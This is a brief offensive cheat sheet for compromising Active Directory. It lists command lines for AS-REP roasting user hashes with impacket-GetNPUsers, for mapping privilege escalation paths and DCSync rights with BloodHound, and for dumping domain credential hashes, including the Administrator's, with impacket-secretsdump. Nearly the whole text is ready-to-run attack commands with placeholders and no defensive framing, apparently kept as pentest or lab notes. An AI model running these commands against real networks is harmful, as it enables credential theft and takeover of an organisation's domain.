Request TGT & Dump User Hash
`impacket-GetNPUsers fqdn/user -dc-ip ipaddress -no-pass`

Bloodhound-Python PrivEsc Mapping
`bloodhound-python -ns ipaddress -d fqdn -c All -u user -p pass`

BloodHound Analysis
```
sudo neo4j start

./BloodHound
3 lines > Database Info > (Scroll Down) > Clear Sessions
3 lines > Database Info > (Scroll Down) > Clear Database
Upload Data (Select JSON files)

Common Strategies
3 lines > Analysis > Dangerous Privileges > Find Principals with DCSync Rights
```

Secrets Dump
```
impacket-secretsdump domain/username@ipaddress
(Enter user password at prompt)
```

Secrets Dump Just Administrator
```
impacket-secretsdump domain/username@ipaddress -just-dc-user Administrator
(Enter user password at prompt)
```


